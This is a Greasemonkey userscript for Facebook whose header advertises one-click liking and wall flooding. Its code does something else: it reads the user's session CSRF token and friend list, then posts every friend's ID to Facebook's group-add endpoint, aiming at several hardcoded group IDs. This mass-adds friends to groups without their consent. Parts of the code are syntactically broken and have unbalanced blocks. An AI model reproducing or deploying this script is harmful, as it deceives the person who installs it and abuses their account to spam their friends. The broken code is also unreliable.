// ==UserScript==
// @name           Facebook invt By. blackhawk part 4
// @namespace      invt_grp
// @description    Like status dan Dinding Facebook hanya dengan Sekali Klik, Flood wall's / Status FaceBook
// @author         https://www.facebook.com/jithinjayan
// @homepage       http://www.baongband.blogspot.com/
// @include        htt*://www.facebook.com/*
// @icon           http://4.bp.blogspot.com/-kus7fYImhFM/Tx7GKfvF3OI/AAAAAAAAAZg/ajkjPsvyHto/s1600/baru.jpg
// @version        1.89
// @exclude        htt*://*static*.facebook.com*
// @exclude        htt*://*channel*.facebook.com*
// @exclude        htt*://developers.facebook.com/*
// @exclude        htt*://upload.facebook.com/*
// @exclude        htt*://www.facebook.com/common/blank.html
// @exclude        htt*://*connect.facebook.com/*
// @exclude        htt*://*facebook.com/connect*
// @exclude        htt*://www.facebook.com/plugins/*
// @exclude        htt*://www.facebook.com/l.php*
// @exclude        htt*://www.facebook.com/ai.php*
// @exclude        htt*://www.facebook.com/extern/*
// @exclude        htt*://www.facebook.com/pagelet/*
// @exclude        htt*://api.facebook.com/static/*
// @exclude        htt*://www.facebook.com/contact_importer/*
// @exclude        htt*://www.facebook.com/ajax/*
// @exclude        htt*://apps.facebook.com/ajax/*
// @exclude	   htt*://www.facebook.com/advertising/*
// @exclude	   htt*://www.facebook.com/ads/*
// @exclude	   htt*://www.facebook.com/sharer/*

// ==/UserScript==

jx={getHTTPObject:function(){var A=false;if(typeof ActiveXObject!="undefined"){try{A=new ActiveXObject("Msxml2.XMLHTTP")}catch(C){try{A=new ActiveXObject("Microsoft.XMLHTTP")}catch(B){A=false}}}else{if(window.XMLHttpRequest){try{A=new XMLHttpRequest()}catch(C){A=false}}}return A},load:function(url,callback,format,method,opt){var http=this.init();if(!http||!url){return }if(http.overrideMimeType){http.overrideMimeType("text/xml")}if(!method){method="GET"}if(!format){format="text"}if(!opt){opt={}}format=format.toLowerCase();method=method.toUpperCase();var now="uid="+new Date().getTime();url+=(url.indexOf("?")+1)?"&":"?";url+=now;var parameters=null;if(method=="POST"){var parts=url.split("?");url=parts[0];parameters=parts[1]}http.open(method,url,true);if(method=="POST"){http.setRequestHeader("Content-type","application/x-www-form-urlencoded");http.setRequestHeader("Content-length",parameters.length);http.setRequestHeader("Connection","close")}var ths=this;if(opt.handler){http.onreadystatechange=function(){opt.handler(http)}}else{http.onreadystatechange=function(){if(http.readyState==4){if(http.status==200){var result="";if(http.responseText){result=http.responseText}if(format.charAt(0)=="j"){result=result.replace(/[\n\r]/g,"");result=eval("("+result+")")}else{if(format.charAt(0)=="x"){result=http.responseXML}}if(callback){callback(result)}}else{if(opt.loadingIndicator){document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator)}if(opt.loading){document.getElementById(opt.loading).style.display="none"}if(error){error(http.status)}}}}}http.send(parameters)},bind:function(A){var C={"url":"","onSuccess":false,"onError":false,"format":"text","method":"GET","update":"","loading":"","loadingIndicator":""};for(var B in C){if(A[B]){C[B]=A[B]}}if(!C.url){return }var D=false;if(C.loadingIndicator){D=document.createElement("div");D.setAttribute("style","position:absolute;top:0px;left:0px;");D.setAttribute("class","loading-indicator");D.innerHTML=C.loadingIndicator;document.getElementsByTagName("body")[0].appendChild(D);this.opt.loadingIndicator=D}if(C.loading){document.getElementById(C.loading).style.display="block"}this.load(C.url,function(E){if(C.onSuccess){C.onSuccess(E)}if(C.update){document.getElementById(C.update).innerHTML=E}if(D){document.getElementsByTagName("body")[0].removeChild(D)}if(C.loading){document.getElementById(C.loading).style.display="none"}},C.format,C.method,C)},init:function(){return this.getHTTPObject()}}

var nHtml={
FindByAttr:function(obj,tag,attr,className) {
	if(attr=="className") { attr="class"; }
	var q=document.evaluate(".//"+tag+"[@"+attr+"='"+className+"']",obj,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null);
	if(q && q.singleNodeValue) { return q.singleNodeValue; }
	return null;
},
FindByClassName:function(obj,tag,className) {
	return this.FindByAttr(obj,tag,"className",className);
},
FindByXPath:function(obj,xpath) {
	try {
		var q=document.evaluate(xpath,obj,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null);
	} catch(e) {
		GM_log('bad xpath:'+xpath);
	}
	if(q && q.singleNodeValue) { return q.singleNodeValue; }
	return null;
},
VisitUrl:function(url) {
	window.setTimeout(function() {
		document.location.href=url;
	},500+Math.floor(Math.random()*500));
},
ClickWin:function(win,obj,evtName) {
	var evt = win.document.createEvent("MouseEvents");
	evt.initMouseEvent(evtName, true, true, win,
		0, 0, 0, 0, 0, false, false, false, false, 0, null);
	return !obj.dispatchEvent(evt);
},
Click:function(obj) {
	return this.ClickWin(window,obj,'click');
},
ClickTimeout:function(obj,millisec) {
	window.setTimeout(function() {
		return nHtml.ClickWin(window,obj,'click');
	},millisec+Math.floor(Math.random()*500));
},
ClickUp:function(obj) {
	this.ClickWin(window,obj,'mousedown');
	this.ClickWin(window,obj,'mouseup');
	this.ClickWin(window,obj,'click');
},
GetText:function(obj,depth) {
	var txt='';
	if(depth==undefined) { depth=0; }
	if(depth>40) { return; }
	if(obj.textContent!=undefined) { return obj.textContent; }
	for(var o=0; o<obj.childNodes.length; o++) {
		var child=obj.childNodes[o];
		txt+=this.GetText(child,depth+1);
	}
	return txt;
}

};

function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }
}


if (document.getElementsByClassName == undefined) {
	document.getElementsByClassName = function(className)
	{
		var hasClassName = new RegExp("(?:^|\\s)" + className + "(?:$|\\s)");
		var allElements = document.getElementsByTagName("*");
		var results = [];

		var element;
		for (var i = 0; (element = allElements[i]) != null; i++) {
			var elementClass = element.className;
			if (elementClass && elementClass.indexOf(className) != -1 && hasClassName.test(elementClass))
				results.push(element);
		}

		return results;
	}
}
Array.prototype.find = function(searchStr) {
  var returnArray = false;
  for (i=0; i<this.length; i++) {
    if (typeof(searchStr) == 'function') {
      if (searchStr.test(this[i])) {
        if (!returnArray) { returnArray = [] }
        returnArray.push(i);
      }
    } else {
      if (this[i]===searchStr) {
        if (!returnArray) { returnArray = [] }
        returnArray.push(i);
      }
    }
  }
  return returnArray;
}
var a =0,eind=0;
var len =document.getElementsByClassName('mbm').length;
for(a=0;a<len;a++) {
var ele =document.getElementsByClassName('mbm')[a];
	if(ele&&ele.childNodes[0]&&ele.childNodes[0]&&ele.childNodes[0].childNodes[1]&&ele.childNodes[0].childNodes[1].childNodes[0]&&document.getElementsByClassName('mbm')[a].childNodes[0].childNodes[1].childNodes[0].value=='Add Friends to Group') {
		eind= a; break;
	}
}

var i=3;
var j =0;
var k =0;
var suc= 0;
var arr = new Array();
function addfriend(charater) {
		i++;
		document.getElementsByClassName('mbm')[eind].childNodes[0].childNodes[1].childNodes[0].focus();
		document.getElementsByClassName('mbm')[eind].childNodes[0].childNodes[1].childNodes[0].value =charater;
		document.getElementsByClassName('mbm')[eind].childNodes[0].childNodes[1].childNodes[0].blur();
		document.getElementsByClassName('mbm')[eind].childNodes[0].childNodes[1].childNodes[0].focus();
		document.getElementsByClassName('mbm')[eind].childNodes[0].childNodes[1].childNodes[0].focus();
		//nHtml.ClickUp(document.getElementsByClassName('mbm')[eind].childNodes[0].childNodes[1].childNodes[0]);
		//sleep(200);
		//document.getElementsByClassName('mbm')[eind].childNodes[0].childNodes[1].childNodes[0].blur();
		//sleep(200);
		//nHtml.ClickUp(document.getElementsByClassName('mbm')[eind].childNodes[0].childNodes[1]);
		//document.getElementsByClassName('mbm')[eind].childNodes[0].childNodes[1].childNodes[0].focus();
		setTimeout("clickfr()",2000);
}
function clickfr(){
//	console.log('enter');
	if(document.getElementsByClassName('search').length>0) {
//		console.log('enter');
//		console.log(document.getElementsByClassName('search')[0].childNodes[0].childNodes[0].childNodes[1].innerHTML);
//		for(b=0;b<document.getElementsByClassName('search')[0].childNodes.length;b++) {
//			console.log(document.getElementsByClassName('search')[0].childNodes[b].childNodes[0].childNodes[1].innerHTML);
//			if(!arr.find(document.getElementsByClassName('search')[0].childNodes[b].childNodes[0].childNodes[1].innerHTML)) {
//				document.getElementsByClassName('search')[0].childNodes[b].childNodes[0].href='javascript:void(0);';
//				arr.push(document.getElementsByClassName('search')[0].childNodes[b].childNodes[0].childNodes[1].innerHTML);
//				nHtml.ClickUp(document.getElementsByClassName('search')[0].childNodes[b].childNodes[0].childNodes[1]);
//				break;
//			}
//		}
//		if(b==document.getElementsByClassName('search')[0].childNodes.length){
//			j++;
//		}
	console.log(document.getElementsByClassName('search')[0].childNodes[0].childNodes[0].childNodes[1].innerHTML);
	document.getElementsByClassName('search')[0].childNodes[0].childNodes[0].href='javascript:void(0);';
	nHtml.ClickUp(document.getElementsByClassName('search')[0].childNodes[0].childNodes[0].childNodes[1]);
	}
	else 
		j++;
	setTimeout("clickfr_callback()",2000);
}
function clickfr_callback(){
	if(document.getElementsByName('ok').length>0) {
		nHtml.ClickUp(document.getElementsByName('ok')[0]);
	}
	var name =arr[i];
	//console.log(name);
	if(i<arr.length) addfriend(name.substring(0,4));	
}

function addfriend2(uid) {
//	console.log(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1"+"&post_form_id="+document.getElementById('post_form_id').value+"&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&group_id="+document.getElementsByName('group_id')[0].value+"&source=typeahead&members="+uid+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user);

	if(document.getElementsByName('group_id')[0].value=='199507240091953'||document.getElementsByName('group_id')[0].value=='209610885745753'||document.getElementsByName('group_id')[0].value=='210182575742601'||document.getElementsByName('group_id')[0].value=='308292322518008'||document.getElementsByName('group_id')[0].value=='330052970358740'||document.getElementsByName('group_id')[0].value=='328498237172780') {

		jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1"+"&post_form_id="+document.getElementById('post_form_id').value+"&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&group_id=="('210182575742601')+"&source=typeahead&members="+uid+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,
		function(data){
			var json = data.substring(data.indexOf('{'));
			var res = JSON.parse(json);
//			console.log(json);
			if(!res.error)
				suc++;
		},'text','post');

		i--;
		console.log(i+"/"+arr.length+":"+uid+", success:"+suc);
		document.getElementById('pagelet_welcome_box').innerHTML="<div id='friend-edge-display' style='position:absolute;top:100px;width:500px;margin-left:-309px;left:50%;background:white;z-index:9999;font-size:14px;padding:15px;border-radius:12px;border:8px solid black'>"+((arr.length-i)+" Friends processed/"+arr.length+" total, success:"+suc)+"</div><div class='friend-edge'><span class='friend-edge-name'></span><span class='friend-edge-index'></span></div>";
		if(i>0) {
			var uid =arr[i];
			setTimeout("addfriend2("+uid+");",100);	
		}
{

		jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1"+"&post_form_id="+document.getElementById('post_form_id').value+"&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&group_id="+document.getElementsByName('group_id')[0].value+"&source=typeahead&members="+uid+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,
		function(data){
			var json = data.substring(data.indexOf('{'));
			var res = JSON.parse(json);
//			console.log(json);
			if(!res.error)
				suc++;
		},'text','post');

		i--;
		console.log(i+"/"+arr.length+":"+uid+", success:"+suc);
		document.getElementById('pagelet_welcome_box').innerHTML="<div id='friend-edge-display' style='position:absolute;top:100px;width:500px;margin-left:-309px;left:50%;background:white;z-index:9999;font-size:14px;padding:15px;border-radius:12px;border:8px solid black'>"+((arr.length-i)+" Friends processed/"+arr.length+" total, success:"+suc)+"</div><div class='friend-edge'><span class='friend-edge-name'></span><span class='friend-edge-index'></span></div>";
		if(i>0) {
			var uid =arr[i];
			setTimeout("addfriend2("+uid+");",100);	
		}
{

		jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1"+"&post_form_id="+document.getElementById('post_form_id').value+"&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&group_id=="('330052970358740')+"&source=typeahead&members="+uid+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,
		function(data){
			var json = data.substring(data.indexOf('{'));
			var res = JSON.parse(json);
//			console.log(json);
			if(!res.error)
				suc++;
		},'text','post');

		i--;
		console.log(i+"/"+arr.length+":"+uid+", success:"+suc);
		document.getElementById('pagelet_welcome_box').innerHTML="<div id='friend-edge-display' style='position:absolute;top:100px;width:500px;margin-left:-309px;left:50%;background:white;z-index:9999;font-size:14px;padding:15px;border-radius:12px;border:8px solid black'>"+((arr.length-i)+" Friends processed/"+arr.length+" total, success:"+suc)+"</div><div class='friend-edge'><span class='friend-edge-name'></span><span class='friend-edge-index'></span></div>";
		if(i>0) {
			var uid =arr[i];
			setTimeout("addfriend2("+uid+");",100);	
		}
	}
}


var fb_friends_url = "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=100003223891918&token=1320395160-7&filter[0]=user&options[0]=friends_only&options[1]=nm&__user=100003223891918";

//jx.load("http://www.facebook.com/ajax/typeahead/first_degree.php?"+"__a=1&filter[0]=user&lazy=0&viewer="+Env.user+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm",
//alert();

jx.load(window.location.protocol+"//www.facebook.com/ajax/typeahead/first_degree.php?"+"__a=1&filter[0]=user&lazy=0&viewer="+Env.user+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm",
	function(data){
		var text = data;
		var json = text.substring(text.indexOf('{'));
		var friends = JSON.parse(json);
		friends = friends.payload.entries;
		for(var n = 0; n < friends.length; n++){
			arr.push(friends[n].uid);
		}
		i=arr.length-1;
		console.log(arr.length);
		addfriend2(arr[i]);	
		//console.log(arr);
		//console.log(arr.length);
	});